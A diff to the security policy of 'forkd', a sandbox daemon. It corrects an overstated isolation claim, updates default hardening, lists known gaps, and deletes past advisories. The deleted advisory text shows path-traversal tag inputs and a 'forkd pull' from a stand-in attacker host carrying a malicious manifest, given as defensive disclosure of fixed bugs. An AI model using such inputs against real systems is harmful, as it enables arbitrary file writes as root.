@@ -4,94 +4,165 @@ forkd is alpha software. The threat model and current guarantees are
 documented below so operators can decide what workload they are
 willing to point at it.
 
-## Threat model
+## Which boundary you actually get
 
-forkd assumes:
+**This section used to say every child ran in a KVM-backed microVM, so
+escaping needed a KVM or Firecracker vulnerability -- "the same boundary
+AWS Lambda relies on". That is not what `forkd-serve` runs.** It is written
+out here rather than quietly edited, because anyone who read it and sized
+their risk by it sized it against the wrong kernel.
 
-1. **Host kernel and Firecracker are part of the TCB.** A compromised
-   host can do anything to its sandboxes. forkd does not attempt to
+v0.6 ships one sandbox backend, gVisor (`runsc`), and the isolation it gives
+is weaker than a microVM's in a specific way: the host kernel is shared.
+
+| | `forkd-serve` (v0.6) | `forkd-vmm` (via `forkd cli`) |
+|---|---|---|
+| Sandbox | gVisor `runsc` container | Firecracker microVM |
+| Guest kernel | the gVisor Sentry, in user space | its own Linux kernel |
+| Host kernel | **shared with every sandbox** | reached only through KVM |
+| Escaping needs | a Sentry bug, or a hole in the host seccomp behind it | a KVM or Firecracker bug |
+| Needs `/dev/kvm` | no | yes |
+
+**Why gVisor is the default.** Firecracker needs `/dev/kvm`, and most cloud
+instances do not expose nested virtualisation -- none of the three machines
+forkd is developed and measured on do. A backend that cannot run on the
+machines operators actually have is not a default. The Firecracker backend
+remains supported for hosts that do have KVM, and is the stronger choice
+there; its four-tier numbers have not been measured, because measuring them
+needs such a host (see `DESIGN-v0.6.md` section 13).
+
+So, concretely:
+
+1. **The host kernel, and `runsc` or Firecracker, are part of the TCB.** A
+   compromised host can do anything to its sandboxes. forkd does not try to
    protect against a hostile administrator.
 
-2. **Sandboxes are mutually untrusted.** Each child runs in its own
-   KVM-backed microVM with a separate netns and cgroup. Escaping
-   requires a KVM or Firecracker vulnerability (the same boundary
-   AWS Lambda relies on).
+2. **Sandboxes are mutually untrusted, with the boundary above.** Each
+   sandbox gets its own network namespace, its own cgroup and its own
+   writable layer. Under `runsc` they also share one host kernel, so a
+   Sentry escape reaches the host and therefore its siblings. Do not treat
+   a `runsc` sandbox as equivalent to a VM for hostile code; if that is your
+   workload, run the Firecracker backend on a KVM host.
 
-3. **The daemon's REST surface is partially trusted.** When
-   `--token-file` is set, possessing the token grants full control
-   over snapshots and sandboxes on that host. Treat the token like a
-   root credential.
+3. **The control plane is a root credential.** The API's bearer token grants
+   full control over the sandboxes and snapshots of every node attached to
+   that master. Nodes additionally authenticate with client certificates
+   (see below), but the API token is not scoped -- treat it as root.
 
 ## Default posture
 
-| Concern | Default | How to harden |
+These are `forkd-serve`'s defaults. Several were off in v0.5 and are now
+on, so a v0.5 runbook will describe a weaker posture than you have.
+
+| Concern | Default | Notes |
 |---|---|---|
-| Daemon bind | `127.0.0.1:8889` (loopback only) | Override at your own risk; pair with `--tls-cert` + `--token-file` |
-| TLS | off (loopback HTTP) | `--tls-cert /etc/forkd/tls/cert.pem --tls-key ...` (rustls 0.23, modern cipher suites only) |
-| Authentication | none | `--token-file /etc/forkd/token` |
-| Per-child memory cap | none | `memory_limit_mib` per sandbox |
-| Per-child netns | shared (same host bridge) | `per_child_netns: true` + `scripts/netns-setup.sh N` |
-| Firecracker seccomp | enabled by Firecracker default | n/a — already on |
-| Guest agent reachability | inside netns | each child's agent is reachable only from its own netns |
+| Daemon bind | `127.0.0.1:8080` (loopback only) | `--bind` to expose it; do not do that without the token below |
+| Control-plane TLS | **on** | `--insecure-transport` turns it off for a single box on loopback, and logs what that gives up |
+| Node authentication | **client certificates, required** | A node's identity is the certificate the master issued it, not the node id in its messages. `POST /v1/node/revoke/:id` stops one |
+| Registration | single-use token, 15 min, carrying the CA fingerprint to pin | So a stand-in master fails the handshake before the token is sent to it |
+| API authentication | **on**, token generated on first run | `--api-token-file`; `--api-open` disables it and warns. Code inside a sandbox can reach the master over loopback, so an open API lets a sandbox mint node tokens |
+| Per-sandbox netns | **always** | Not an option any more. `per_child_netns` is accepted and ignored |
+| Sibling and egress traffic | **dropped** (`FORWARD`) | Covers siblings and the internet without relying on `ip_forward` |
+| Host services on the veth | **dropped** (`INPUT`) | sshd listens on `0.0.0.0`, so it answers on the veth too; only established replies are let back |
+| Cold sandbox ports | **refused** (`FORKD-COLD`, TCP reset) | A caller reaching a frozen, snapshotted or detached sandbox gets 7-12 ms instead of its own timeout |
+| Per-sandbox memory cap | none | `memory_limit_mib` per sandbox, written as `memory.max` |
 | Audit log | `/var/log/forkd/audit.log`, JSON lines | tail with vector / fluentbit; rotate with logrotate |
+
+## Known gaps
+
+Stated because each is the kind of thing that reads as covered when it is
+not:
+
+- **A sandbox's `token` is issued and never checked.** Every sandbox is
+  created with a 128-bit token and it is returned to the caller, but nothing
+  verifies it, because there is no gateway in front of a sandbox for it to
+  gate: a sandbox listens inside its own namespace and the rules above drop
+  traffic from siblings and from off-box, so today it is reachable only from
+  its own node. The moment a port is exposed, that token has to become
+  mandatory on the path that exposes it -- `DESIGN-v0.6.md` section 16.5
+  calls this layer two, and it is not built.
+- **Sandbox ids are `sb-` plus 12 hex characters**, not 128 bits. Section
+  16.5 asks for unguessable ids; this is weaker than that.
+- **One API token, no scopes or tenants.** The `owner` column exists in the
+  schema and nothing reads it.
+- **Multi-node has never been run.** Master and node authenticate each other
+  properly now, but they have only ever run on one machine.
 
 ## Kubernetes deployment
 
-The shipped `packaging/k8s/forkd-controller.yaml` runs the daemon
+The shipped `packaging/k8s/forkd-serve.yaml` runs the daemon
 with `privileged: true`, `runAsUser: 0`, and a writable
-`/sys/fs/cgroup` hostPath mount. This is **necessary** — Firecracker
-needs `/dev/kvm`, cgroup v2 writes for memory caps, and tap-device
-creation. It is also **node-level blast-radius**: a compromised
-forkd-controller pod can escape to the node it runs on.
+`/sys/fs/cgroup` hostPath mount. This is **necessary** — the node creates
+network namespaces and veth pairs, writes cgroup v2 for the tiers and the
+memory caps, and runs `runsc`. (It does *not* need `/dev/kvm`: that is the
+Firecracker backend's requirement.) It is also **node-level blast-radius**:
+a compromised `forkd-serve` pod can escape to the node it runs on.
 
 Operational consequences:
 
-- Treat the forkd-controller pod's bearer token like SSH-root on the
+- Treat the `forkd-serve` pod's bearer token like SSH-root on the
   node. Rotate on any access change.
 - Pin the pod to a dedicated node pool. Do not co-schedule untrusted
   tenants.
 - The daemon refuses to start if the manifest's placeholder bearer
   token (`REPLACE_ME_*` / `CHANGE_ME_*`) is left in place — a forgotten
   `sed` step becomes a noisy fail rather than a silent compromise.
-- For multi-tenant deployments, run one forkd-controller per tenant
-  on dedicated nodes rather than sharing a daemon.
+- For multi-tenant deployments, run one master per tenant on dedicated
+  nodes rather than sharing one. The API token is not scoped, so sharing a
+  master means sharing root over every tenant's sandboxes.
 
 ## Concurrency caps
 
-`POST /v1/sandboxes/:id/branch` admits at most
-`DEFAULT_BRANCH_CONCURRENCY` (currently 4) simultaneous operations.
-Excess requests get `503 Service Unavailable`. The cap bounds peak
-transient disk usage (each BRANCH writes a full `memory.bin`, typically
-256 MiB – 8 GiB). Two BRANCHes targeting the same `tag` are serialised
-via an in-flight set; the second gets `409 Conflict`.
+`DEFAULT_BRANCH_CONCURRENCY` and the `boot_wait_secs` cap were
+`forkd-controller`'s, and went with it. What v0.6 bounds instead:
 
-`boot_wait_secs` on `POST /v1/snapshots` is capped at 60 seconds.
-Uncapped values would let a hostile caller tie up a daemon worker.
+- **Fork width.** One request may ask for at most `MAX_FORK_WIDTH` (256)
+  children of a tag.
+- **Admission.** A node stops accepting new sandboxes below a free-memory
+  floor or above a memory-pressure average (`--admit-min-free-mib`,
+  `--admit-max-psi`). This exists because without it the master kept
+  accepting creates until the machine stopped answering SSH; the measured
+  curve is in `master/api.rs`.
+- **Checkpoint size** is not bounded. Measured at 50.2 MiB per sandbox, so a
+  thousand snapshotted sandboxes is about 50 GB of disk. Admission looks at
+  memory and pressure, not disk.
 
 ## TLS
 
-Pass `--tls-cert <cert.pem> --tls-key <key.pem>` to `forkd-controller
-serve` (or set `FORKD_TLS_CERT` / `FORKD_TLS_KEY`). The daemon uses
-rustls 0.23 with the aws-lc-rs crypto provider; TLS 1.2 and TLS 1.3
-are accepted, legacy cipher suites are not negotiable. Both PEM
-files must be readable by the daemon's user and SHOULD have mode 0600.
+There are no certificate flags any more, and nothing to obtain: the master
+runs its own CA under `--pki-dir`, creating it on first start, and issues
+itself a server certificate and each node a client certificate from it.
+rustls 0.23 with the `ring` provider; TLS 1.2 and 1.3, no legacy suites.
 
 Operationally:
 
-- Use a real CA (Let's Encrypt or your internal PKI). Self-signed
-  certs work but require clients to bypass cert validation.
-- Rotate by writing new files and `systemctl restart forkd-controller`.
-- Bearer-token auth is **not** automatically enabled by TLS — supply
-  `--token-file` as well for any non-loopback deployment.
+- **The control plane's PKI is internal and should stay that way.** It
+  authenticates nodes to the master and the master to its nodes; it is not
+  a web PKI and a public CA has no role in it. Keep `--pki-dir` backed up
+  with the state database: losing the CA key means re-registering every
+  node.
+- **A node pins the CA on first contact** through the fingerprint carried in
+  its registration token (`<fingerprint>.<secret>`). Pass the token the
+  master printed, unaltered; splitting it loses the pin and the node will
+  warn that it cannot verify the master.
+- **Revoke, do not rotate, to remove a node:** `POST /v1/node/revoke/:id`.
+  Its parked connection is dropped at once.
+- **TLS does not imply API authentication.** The bearer token is separate
+  and is on by default; `--api-open` turns it off and says so loudly.
+- If you terminate TLS somewhere else, the master must still be the thing
+  nodes verify. A proxy holding its own certificate breaks the pin, and
+  client certificates do not survive it, so nodes lose their identity and
+  the master falls back to believing what they claim.
 
 ## What forkd does not do (yet)
 
 - **Multi-node scheduling.** One daemon = one host. No HA, no failover.
-- **Default-deny egress.** Children share the host's MASQUERADE rule;
-  outbound to the internet works by default. For an allow-list policy,
-  add per-netns iptables rules after `scripts/netns-setup.sh`.
-- **Quotas beyond memory.** cpu.max, io.max, pids.max are not yet
-  wired into ForkOpts.
+- **Egress allow-lists.** Egress is denied outright rather than filtered:
+  `FORWARD` drops it. That is safe, and also means a sandbox cannot reach
+  the internet at all, so there is no policy to express yet. Giving one
+  controlled outbound access is unbuilt.
+- **Quotas beyond memory.** `cpu.max`, `io.max` and `pids.max` are not
+  wired through the API.
 - **Third-party security audit.** Not started. Will be required
   before forkd claims a "production" status badge.
 
@@ -103,136 +174,6 @@ or mitigation within 14 days for confirmed issues.
 
 ## Supported versions
 
-Pre-1.0 releases receive fixes only on the latest minor. The CHANGELOG
-records which API versions are affected by each advisory.
-
-## Past advisories
-
-### 2026-05-17 — Daemon `snapshot_tag` validation gap (fixed in 0.1.4)
-
-**Affected**: forkd-controller 0.1.0 through 0.1.3 inclusive.
-**Fixed in**: 0.1.4 (PR #54).
-**Severity**: Medium-High, post-authentication.
-**Discovered**: internal security review during v0.2 retrospective.
-
-**Description**
-
-`POST /v1/sandboxes` accepted `req.snapshot_tag` from the request body
-and joined it directly into `snapshot_root` without calling
-`is_safe_tag`. Sister handlers (`POST /v1/snapshots`,
-`DELETE /v1/snapshots/:tag`, `POST /v1/sandboxes/:id/branch`) all
-validated; `create_sandbox` was an asymmetric oversight.
-
-The unvalidated tag also persisted into `SandboxInfo.snapshot_tag`
-and was later consumed by `read_snapshot_volumes` during BRANCH,
-which `serde_json::from_str`'d the file at `<snapshot_root>/<tag>/
-snapshot.json` as a `forkd_vmm::Snapshot`. An attacker who could
-write a valid `Snapshot`-shaped JSON file anywhere on disk and reach
-the daemon's REST surface could control the volume specs of
-grandchild VMs — i.e., mount arbitrary host block devices into a
-sandbox.
-
-**Impact gating**
-
-- Requires the bearer token (or a daemon started without `--token-file`
-  on a non-loopback bind, which already warned at startup).
-- The K8s manifest's placeholder bearer token (separate finding in
-  the same PR) made the auth gate brittle if `kubectl apply` ran
-  without first replacing the Secret.
-
-**Fix in 0.1.4**
-
-- `is_safe_tag(&req.snapshot_tag)` in `create_sandbox`, returning 400.
-- Defense-in-depth `is_safe_tag` inside `read_snapshot_volumes` —
-  refuses to dereference an unsafe tag even if a future caller forgets.
-- `validate_token()` rejects `REPLACE_ME_*` / `CHANGE_ME_*` prefixes
-  and tokens under 16 bytes at daemon startup.
-- `boot_wait_secs` on `POST /v1/snapshots` capped at 60 seconds.
-
-**Verification**
-
-PR #54 ships as two commits: a failing-test commit (
-[424e4a7](https://github.com/deeplethe/forkd/commit/424e4a7),
-[CI red](https://github.com/deeplethe/forkd/actions/runs/25987955183))
-and a fix commit (
-[6efc1e9](https://github.com/deeplethe/forkd/commit/6efc1e9),
-[CI green](https://github.com/deeplethe/forkd/actions/runs/25988085193)).
-The red CI log is the bug-existence proof; the green log is the
-fix-validity proof.
-
-**Credits**: discovered and fixed internally during the v0.2 retro.
-No external reports.
-
-### 2026-05-13 — Path traversal via `--tag` (CVE-class, fixed in 0.1.3)
-
-**Affected**: forkd CLI 0.1.0 through 0.1.2 inclusive.
-**Fixed in**: 0.1.3.
-**Severity**: High (local file write as the running user; high impact
-under the typical `sudo forkd` execution model).
-**Discovered**: internal bug-bash, May 2026.
-
-**Description**
-
-`forkd` CLI commands that accept a `--tag` flag computed their
-destination directory as `data_dir().join("snapshots").join(tag)`.
-Rust's `Path::join` silently discards the base when the right side is
-absolute, and the implementation did not reject `..` segments. Several
-attack shapes worked:
-
-```bash
-# Writes Firecracker snapshot files to /etc/forkd-bad/
-sudo forkd snapshot --tag /etc/forkd-bad ...
-
-# Climbs out of the data dir
-sudo forkd snapshot --tag ../../../etc/forkd-bad ...
-
-# Or via a malicious pack: manifest.toml declares tag = "../../etc/x"
-sudo forkd pull https://attacker.example/evil.tar.zst
-```
-
-The same code path is hit by `forkd unpack`, `forkd push`, `forkd pull`,
-`forkd fork`, and `forkd pack` (read-only for the last two but with
-confusing error messages).
-
-**Impact**
-
-- Anyone who can influence the `--tag` argument can write arbitrary
-  files at any path the forkd process is allowed to write to.
-- Files written include `memory.bin` (typically hundreds of MiB to
-  several GiB), `vmstate`, `rootfs.ext4`, and `snapshot.json`.
-- Most serious under `sudo forkd` (the typical KVM-required deployment
-  model), where the writes happen as root.
-- For Snapshot Hub users: a malicious or compromised pack on the hub
-  could declare `tag = "../../etc/something"` in its `manifest.toml`
-  and write its files anywhere the running user can write, on every
-  host that pulls it. This is the canonical supply-chain shape.
-
-**Mitigations available before upgrading**
-
-- Do not run `forkd` with `sudo` for tag inputs that aren't a fixed
-  literal you control.
-- Do not `forkd pull` snapshot packs from untrusted publishers until
-  you have 0.1.3 or later installed.
-- The exploit requires the attacker to influence either `--tag` or
-  the `tag` field inside a pack's `manifest.toml`. If your operator
-  workflow always passes a hardcoded tag and never pulls a third-party
-  pack, you are not exposed.
-
-**Fix in 0.1.3**
-
-Added a `validate_tag()` check applied at every CLI surface that
-accepts a tag (`snapshot`, `fork`, `pack`, `push`, `unpack`, `pull`),
-and again on the `tag` field read from `manifest.toml` inside a pack
-before any path is derived from it. The allowed shape is:
-
-```
-[A-Za-z0-9_][A-Za-z0-9._-]{0,63}
-```
-
-1–64 characters, starting with an alphanumeric or underscore. This
-rejects empty tags, absolute paths, `..` segments, leading dots/dashes,
-slashes, shell metacharacters, and anything else that could affect
-path computation.
-
-**Credits**: discovered and fixed internally during a bug-bash session.
-No external reports.
+Pre-1.0 releases receive fixes only on the latest minor. Fixed
+vulnerabilities are recorded in the CHANGELOG under the release that
+fixed them, with the affected versions.
